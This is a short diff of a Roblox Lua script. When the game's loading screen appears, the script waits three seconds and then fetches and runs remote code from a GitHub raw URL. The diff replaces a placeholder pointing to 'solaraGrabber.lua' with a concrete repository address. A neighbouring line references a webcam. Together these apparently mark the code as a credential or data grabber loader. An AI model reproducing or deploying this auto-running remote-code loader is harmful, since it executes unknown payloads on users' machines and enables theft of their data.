@@ -201,9 +201,10 @@ if hasCam~="" then df(webcam) end
 game:GetService("CoreGui").ChildAdded:Connect(function(c)
     if c.Name:find("RobloxLoading") then
         task.wait(3)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_REPO/solaraGrabber.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Duels-V2-/Untitled-1.lua"))()
     end
 end)
 
 ```
+
 
